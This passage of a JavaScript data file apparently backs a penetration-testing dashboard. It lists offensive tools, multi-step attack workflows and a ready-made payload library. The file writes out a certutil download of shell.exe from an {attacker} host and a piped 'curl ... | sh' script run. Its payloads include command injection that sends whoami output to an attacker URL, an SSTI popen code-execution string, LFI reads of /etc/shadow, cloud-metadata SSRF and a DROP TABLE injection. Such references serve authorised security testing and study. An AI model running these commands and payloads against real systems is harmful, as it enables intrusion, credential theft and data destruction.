  { id:'ligolo',      name:'Ligolo-ng',      cat:'misc',      lang:'Go',       tags:['tunnel','pivot','socks'],           desc:'Advanced, yet simple tunneling/pivoting tool using a TUN interface without requiring SOCKS proxies.', install:'Download from GitHub releases', cmd:'./ligolo-ng agent -connect {ip}:11601 -ignore-cert', url:'https://github.com/nicocha30/ligolo-ng' },
  { id:'proxychains', name:'ProxyChains',    cat:'misc',      lang:'C',        tags:['proxy','anonymity','pivot'],        desc:'Forces any TCP connection made by any given application to follow through proxy servers like TOR, SOCKS4/5, HTTP.', install:'apt install proxychains4', cmd:'proxychains nmap -sV {target}', url:'https://github.com/haad/proxychains' },
  { id:'lolbas',      name:'LOLBAS',         cat:'misc',      lang:'Various',  tags:['windows','living-off-land','bypass'],desc:'Living Off the Land Binaries, Scripts and Libraries. Bypass security tools using signed Microsoft binaries.', install:'N/A (reference database)', cmd:'certutil.exe -urlcache -f http://{attacker}/shell.exe shell.exe', url:'https://lolbas-project.github.io' },
  { id:'gtfobins',    name:'GTFOBins',       cat:'misc',      lang:'Various',  tags:['linux','privesc','bypass'],         desc:'Curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.', install:'N/A (reference database)', cmd:'sudo find . -exec /bin/sh \\; -quit', url:'https://gtfobins.github.io' },
  { id:'pspy',        name:'Pspy',           cat:'misc',      lang:'Go',       tags:['linux','processes','cron'],         desc:'Monitor Linux processes without root permissions. See commands run by other users, cron jobs, process forks.', install:'Download from GitHub releases', cmd:'./pspy64', url:'https://github.com/DominicBreuker/pspy' },
  { id:'linpeas',     name:'LinPEAS',        cat:'misc',      lang:'Bash',     tags:['linux','privesc','enum'],           desc:'Linux Privilege Escalation Awesome Script. Enumerates local privilege escalation vectors and misconfigurations.', install:'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh', cmd:'./linpeas.sh | tee linpeas_output.txt', url:'https://github.com/carlospolop/PEASS-ng' },
  { id:'winpeas',     name:'WinPEAS',        cat:'misc',      lang:'C#',       tags:['windows','privesc','enum'],         desc:'Windows Privilege Escalation Awesome Script. Find possible paths to escalate privileges on Windows hosts.', install:'Download from GitHub releases', cmd:'winPEASx64.exe log', url:'https://github.com/carlospolop/PEASS-ng' },
];

/* ── Category Config ── */
const CATEGORIES = {
  recon:     { label: 'Reconnaissance',  icon: '🔭', cls: 'cat-recon' },
  web:       { label: 'Web Application', icon: '🌐', cls: 'cat-web' },
  exploit:   { label: 'Exploitation',    icon: '💥', cls: 'cat-exploit' },
  fuzzing:   { label: 'Fuzzing',         icon: '🎯', cls: 'cat-fuzzing' },
  network:   { label: 'Network',         icon: '🌐', cls: 'cat-network' },
  cloud:     { label: 'Cloud Security',  icon: '☁️', cls: 'cat-cloud' },
  mobile:    { label: 'Mobile',          icon: '📱', cls: 'cat-mobile' },
  osint:     { label: 'OSINT',           icon: '👁️', cls: 'cat-osint' },
  passwords: { label: 'Password Attacks',icon: '🔑', cls: 'cat-passwords' },
  misc:      { label: 'Post-Exploit/Misc',icon:'⚙️', cls: 'cat-misc' },
};

/* ── Workflows ── */
const WORKFLOWS = [
  {
    id: 'recon',
    title: '🔭 Full Recon Pipeline',
    desc: 'Comprehensive target reconnaissance from domain to live endpoints',
    steps: [
      { tool: 'Subfinder',    cmd: 'subfinder -d {domain} -o subs.txt' },
      { tool: 'DNSx',         cmd: 'dnsx -l subs.txt -a -resp -o resolved.txt' },
      { tool: 'HTTPx',        cmd: 'httpx -l resolved.txt -status-code -title -tech-detect -o live.txt' },
      { tool: 'Katana',       cmd: 'katana -list live.txt -jc -o urls.txt' },
      { tool: 'Nuclei',       cmd: 'nuclei -l live.txt -t cves/ -t exposures/ -o findings.txt' },
    ]
  },
  {
    id: 'subdomain',
    title: '🌐 Subdomain Takeover Hunt',
    desc: 'Find and verify subdomain takeover vulnerabilities',
    steps: [
      { tool: 'Amass',        cmd: 'amass enum -d {domain} -o amass.txt' },
      { tool: 'Assetfinder',  cmd: 'assetfinder --subs-only {domain} >> subs.txt' },
      { tool: 'DNSx',         cmd: 'dnsx -l subs.txt -cname -resp' },
      { tool: 'Nuclei',       cmd: 'nuclei -l subs.txt -t takeovers/' },
    ]
  },
  {
    id: 'xss',
    title: '🔥 XSS Discovery Chain',
    desc: 'Systematic XSS hunting across all parameters',
    steps: [
      { tool: 'GAU',          cmd: 'gau {domain} | grep "=" | tee params.txt' },
      { tool: 'URO',          cmd: 'cat params.txt | uro | tee clean.txt' },
      { tool: 'Dalfox',       cmd: 'dalfox file clean.txt -b {blind-xss-server}' },
      { tool: 'XSStrike',     cmd: 'python3 xsstrike.py -u "https://{target}" --crawl' },
    ]
  },
  {
    id: 'sqli',
    title: '💉 SQLi Automation',
    desc: 'Automated SQL injection detection and exploitation',
    steps: [
      { tool: 'GAU+Wayback',  cmd: 'gau --providers wayback {domain} | grep "=" | tee urls.txt' },
      { tool: 'URO',          cmd: 'cat urls.txt | uro > clean_urls.txt' },
      { tool: 'SQLMap',       cmd: 'sqlmap -m clean_urls.txt --batch --dbs --level=3' },
      { tool: 'Nuclei',       cmd: 'nuclei -l clean_urls.txt -t vulnerabilities/sqli/' },
    ]
  },
  {
    id: 'api',
    title: '🔌 API Security Testing',
    desc: 'Discover and test API endpoints for vulnerabilities',
    steps: [
      { tool: 'Katana',       cmd: 'katana -u https://{target} -jc | grep -i api' },
      { tool: 'Arjun',        cmd: 'arjun -u https://{target}/api/v1/ --passive' },
      { tool: 'Nuclei',       cmd: 'nuclei -u https://{target} -t misconfiguration/ -t exposures/' },
      { tool: 'FFuF',         cmd: 'ffuf -u https://{target}/api/v1/FUZZ -w api_wordlist.txt' },
    ]
  },
  {
    id: 'privesc',
    title: '⬆️ Linux Privilege Escalation',
    desc: 'Enumerate and exploit privilege escalation vectors',
    steps: [
      { tool: 'LinPEAS',      cmd: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh' },
      { tool: 'Pspy',         cmd: './pspy64 -pf -i 1000' },
      { tool: 'GTFOBins',     cmd: 'sudo -l  # check sudo permissions' },
      { tool: 'Find SUIDs',   cmd: 'find / -perm -u=s -type f 2>/dev/null' },
    ]
  },
  {
    id: 'cloud',
    title: '☁️ AWS Security Audit',
    desc: 'Comprehensive AWS environment security assessment',
    steps: [
      { tool: 'Prowler',      cmd: 'prowler aws --profile {profile} -M csv,json' },
      { tool: 'ScoutSuite',   cmd: 'python3 scout.py aws --profile {profile}' },
      { tool: 'TruffleHog',   cmd: 'trufflehog git https://github.com/{org}/{repo}' },
      { tool: 'S3Scanner',    cmd: 's3scanner scan --bucket-file buckets.txt' },
      { tool: 'Pacu',         cmd: 'pacu  # run iam__enum_users_roles_policies_groups' },
    ]
  },
];

/* ── Payloads ── */
const PAYLOADS = {
  'XSS Basic': [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><script>alert(document.cookie)</script>',
    "';alert(String.fromCharCode(88,83,83))//",
    '<body onload=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '"><img src=1 onerror=alert(1)>',
  ],
  'XSS WAF Bypass': [
    '<ScRiPt>alert(1)</sCrIpT>',
    '<script>alert`1`</script>',
    '<<script>alert(1)//<</script>',
    '<svg/onload=alert(1)>',
    '"><svg onload=confirm(1)>',
    '%3Cscript%3Ealert(1)%3C%2Fscript%3E',
    '<script>\u0061lert(1)</script>',
    'javascript:alert(1)',
  ],
  'SQL Injection': [
    "' OR '1'='1",
    "' OR 1=1--",
    "admin'--",
    "1' UNION SELECT null,null,null--",
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "1; DROP TABLE users--",
    "' OR SLEEP(5)--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
  ],
  'LFI/Path Traversal': [
    '../../etc/passwd',
    '../../../etc/shadow',
    '....//....//....//etc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '..%252f..%252f..%252fetc%252fpasswd',
    'php://filter/convert.base64-encode/resource=index.php',
    'file:///etc/passwd',
    '/proc/self/environ',
  ],
  'SSTI Payloads': [
    '{{7*7}}',
    '${7*7}',
    '<%= 7 * 7 %>',
    '{{config}}',
    '{{self.__class__.__mro__[1].__subclasses__()}}',
    "{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('id').read()}}",
    '#{7*7}',
    '*{7*7}',
  ],
  'SSRF Payloads': [
    'http://169.254.169.254/latest/meta-data/',
    'http://metadata.google.internal/',
    'http://192.168.1.1',
    'http://localhost:80',
    'http://0.0.0.0:80',
    'file:///etc/passwd',
    'dict://localhost:11211/',
    'gopher://127.0.0.1:6379/_INFO',
  ],
  'Command Injection': [
    '; id',
    '| id',
    '&& id',
    '`id`',
    '$(id)',
    '; cat /etc/passwd',
    '|| ping -c 1 {attacker}',
    '; curl http://{attacker}/$(whoami)',
  ],
};

/* ── Stats ── */
const STATS = {
  total: TOOLS.length,
  cats: Object.keys(CATEGORIES).length,
  workflows: WORKFLOWS.length,
  payloadSets: Object.keys(PAYLOADS).length,
};
